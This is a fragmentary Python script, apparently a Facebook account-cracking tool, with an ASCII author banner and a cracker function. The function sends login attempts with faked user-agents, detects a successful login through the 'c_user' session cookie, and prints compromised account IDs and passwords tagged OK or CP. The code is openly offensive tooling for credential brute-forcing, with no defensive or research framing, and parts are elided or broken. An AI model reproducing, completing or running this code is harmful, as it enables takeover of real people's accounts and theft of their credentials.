...
|  $$$$$$/| $$  | $$| $$      | $$/   \  $$| $$  | $$| $$ \  $$
 \______/ |__/  |__/|__/      |__/     \__/|__/  |__/|__/  \__/                                                                                                                                                                                   
	print("%s╔══════════════════════════════════════════╗"%(Z))
	print("%s║%s  Author   : SAFWAN ISLAM 
	print("%s║%s  Github   : SAFWAN GAMING 
	print("%s║%s  FACEBOOK : JOMIDAR 
	print("%s║%s  Version  : %s1.0                          
	print("%s╚══════════════════════════════════════════╝"%(Z))
	print("")
...
def cracker(uid,pwx,tl):
    ...
    'user-agent': sex(),
			...
			if 'c_user' in fb_cookies:
				...
				uidx = coki[65:80]
				print('\033[1;32m [SAFWAN-OK] '+uidx+' | '+pasw+'\033[0;97m')
				...
				coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
				uidx = coki[82:97]
				print('\033[1;31m [SAFWAN-CP] '+uidx+' | '+pasw+'\033[0;97m')
